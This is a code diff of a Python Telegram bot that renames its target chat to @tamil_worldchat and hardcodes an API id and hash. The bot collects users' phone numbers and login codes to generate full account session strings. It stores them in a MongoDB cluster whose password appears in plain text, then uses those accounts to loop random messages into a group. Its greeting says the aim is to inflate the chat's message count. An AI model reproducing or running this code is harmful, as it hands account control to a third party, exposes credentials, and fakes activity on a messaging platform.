@@ -19,7 +19,7 @@ import random
 import threading
 import asyncio
 import time
-from config import *
+from .config import *
 
 client = MongoClient('mongodb+srv://logi:logi@cluster0.kistqqd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
 db = client['clients']  # Replace with your database name
@@ -114,12 +114,12 @@ def save_clients():
 
 async def start_the_client():
     for cli in clients:
-        insta_cli = Client(f"client{cli[0]}",api_id=API_ID,api_hash=API_HASH,session_string=cli[1])
+        insta_cli = Client(f"client{cli[0]}",api_id=api_id,api_hash=api_hash,session_string=cli[1])
         client_objects.append([cli[0],insta_cli])
         try:
             if cli[2]:
                 await insta_cli.start()
-            await insta_cli.join_chat("tamilgold")
+            await insta_cli.join_chat("tamil_worldchat")
         except Unauthorized as e:
             #await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={cli[0]})")
             try:
@@ -145,7 +145,7 @@ async def start(cli,message):
     caption = f"""
 Hello {message.from_user.first_name} , 
 
-~  This Bot Mainly created for @tamilgold to increase the message count.
+~  This Bot Mainly created for @tamil_worldchat to increase the message count.
 ~  Some basic idealogy was used for this creation .
 ~  This is not gonne be a spam , beacuse message will send at a specific interval.
 ~  for more information use /help .
@@ -186,8 +186,8 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     await msg.reply(f"» ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ...")
     user_id = msg.chat.id
     if True:
-        api_id = API_ID
-        api_hash = API_HASH
+        api_id = 24398746
+        api_hash = "b9077f84ac40e5615ff02c6f964924f9"
     if not is_bot:
         t = "» ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ᴩʜᴏɴᴇ_ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ғᴏʀ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ. \nᴇxᴀᴍᴩʟᴇ : `+910000000000`'"
     else:
@@ -266,9 +266,9 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-        instn_cli = Client(f"client{user_id}",api_id=API_ID,api_hash=API_HASH ,session_string=string_session)
+        instn_cli = Client(f"client{user_id}",api_id=api_id,api_hash=api_hash ,session_string=string_session)
         try:
-            await instn_cli.join_chat("tamilgold")
+            await instn_cli.join_chat("tamil_worldchat")
         except Exception as e:
             pass
         clients.append([msg.from_user.id , string_session , False])
@@ -328,8 +328,8 @@ async def start_message():
     while(True):
         for i in client_objects:
                 try:
-                    await i[1].send_message(-1001506877923,random.choice(whisper_messages),reply_to_message_id=random.randint(27000,33587))
-                    time.sleep(3)
+                    await i[1].send_message(-1002208263384,random.choice(whisper_messages),reply_to_message_id=random.randint(700,800))
+                    time.sleep(2)
 
                 except Unauthorized as e:
                     await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={i[0]})")
@@ -351,14 +351,13 @@ async def start_message():
                     print("Error")
                     time.sleep(2)
                     continue
-        time.sleep(4)
-        time.sleep(random.randint(1,5))
+        time.sleep(5)
 
 
 
 @app.on_message(filters.command("message") & filters.private)
 async def messageon(cli,mes):
-    result = await app.ask(mes.chat.id ,text="Plese Join Here @tamilgold after that send __yes__ , you already joined means also send __yes__ here")
+    result = await app.ask(mes.chat.id ,text="Plese Join Here @tamil_worldchat after that send __yes__ , you already joined means also send __yes__ here")
     if result.text == "yes" or "Yes":
         for cli in clients:
             if cli[0] == mes.from_user.id:
